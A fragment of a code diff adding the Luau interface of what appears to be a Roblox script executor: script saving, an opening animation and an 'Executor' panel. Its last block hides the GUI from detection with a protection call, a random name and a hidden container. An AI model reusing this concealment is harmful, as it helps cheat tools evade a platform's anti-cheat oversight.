+	saveBtn.Position = UDim2.fromScale(0.5, 0.8);
+	saveBtn.AnchorPoint = Vector2.new(0.5, 0.5);
+	saveBtn.Size = UDim2.fromOffset(40, 40);
+	saveBtn.IconSize = 20;
+	saveBtn.Image = "rbxassetid://4732495519";
+	
+	-- save system
+	saveBtn.Clicked:Connect(function()
+		local code = editor.getCode();
+		local name = textbox.Text;
+		-- checks
+		if #name == 0 then
+			return;
+		end
+		-- add to scripthub if not present
+		scriptshub.addScript(name, code, true);
+		-- save to config
+		config.data.scripts[name] = code;
+		config.save();
+		script.Parent.Visible = false;
+	end)
+	
+	-- auto focus
+	script.Parent:GetPropertyChangedSignal("Visible"):Connect(function()
+		if script.Parent.Visible then
+			textboxIns:CaptureFocus();
+		end
+	end)
+end)();
+
+coroutine.wrap(function()
+	local script = Instance.new("LocalScript", fd4hh21cgefg.dh712eh636);
+	
+	-- service
+	local tweenService = game:GetService("TweenService");
+	local utils = require(script.Parent.utils);
+	
+	-- vars
+	local main = script.Parent.Main;
+	local bodies = main.BodyClipping;
+	local resizeBtn = main.Resize;
+	local sidebar = main.Sidebar;
+	local topbar = main.Topbar;
+	local uiCorner = main.UICorner;
+	
+	-- defaults
+	local defaultSize = main.Size;
+	local defaultRadius = uiCorner.CornerRadius;
+	
+	-- icon setup
+	local icon = Instance.new("ImageLabel", main);
+	icon.BackgroundTransparency = 1;
+	icon.Image = "rbxassetid://10352444178";
+	icon.Size = UDim2.new(0, 80, 0, 80);
+	icon.AnchorPoint = Vector2.new(0.5, 0.5);
+	icon.Position = UDim2.new(0.5, 0, 0.5, 0);
+	
+	-- start point setup
+	bodies.Visible = false;
+	resizeBtn.Visible = false;
+	sidebar.Visible = false;
+	topbar.Visible = false;
+	uiCorner.CornerRadius = UDim.new(1, 0); -- circle
+	main.Size = UDim2.new(0, 100, 0, 100);
+	main.AnchorPoint = Vector2.new(0.5, 0.5);
+	main.Position = UDim2.new(0.5, 0, 1, main.AbsoluteSize.Y);
+	
+	uiCorner:Clone().Parent = icon;
+	
+	-- make sure home is visible (workflow)
+	for i, v in next, bodies:GetChildren() do
+		v.Visible = false;
+	end
+	bodies.Executor.Visible = true;
+	
+	-- studio game load
+	if game:GetService("RunService"):IsStudio() then
+		task.wait(1);
+	end
+	
+	-- tween ball on center
+	local moveTween = tweenService:Create(
+		main,
+		utils.tweenInfo.slowBackMove,
+		{
+			Position = UDim2.new(0.5, 0, 0.5, 0);
+		}
+	);
+	-- icon animation
+	tweenService:Create(
+		icon,
+		utils.tweenInfo.slowBackMove,
+		{
+			Rotation = 360*2;
+		}
+	):Play();
+	moveTween:Play();
+	moveTween.Completed:Wait();
+	
+	
+	-- expand main
+	local expandTween = tweenService:Create(
+		main,
+		utils.tweenInfo.expand,
+		{
+			Size = defaultSize;
+		}
+	);
+	expandTween:Play();
+	tweenService:Create(
+		uiCorner,
+		utils.tweenInfo.expand,
+		{
+			CornerRadius = defaultRadius;
+		}
+	):Play();
+	-- disappear icon animation
+	tweenService:Create(
+		icon,
+		utils.tweenInfo.expand,
+		{
+			ImageTransparency = 1;
+		}
+	):Play();
+	expandTween.Completed:Wait();
+	
+	icon:Destroy();
+	main.AnchorPoint = Vector2.new(0, 0);
+	main.Position = UDim2.new(0.5, -defaultSize.X.Offset/2, 0.5, -defaultSize.Y.Offset/2);
+	bodies.Visible = true;
+	resizeBtn.Visible = true;
+	sidebar.Visible = true;
+	topbar.Visible = true;
+end)();
+
+coroutine.wrap(function()
+	local script = Instance.new("LocalScript", fd4hh21cgefg.dh712eh636);
+	local magnolia = require(script.Parent.magnolia);
+	
+	local canvas = script.Parent;
+	
+	magnolia.ProtectGui(canvas);
+	canvas.Name = magnolia.Utils.RandomString(math.random(5, 8));
+	canvas.Parent = magnolia.GetHiddenGui();
+end)();
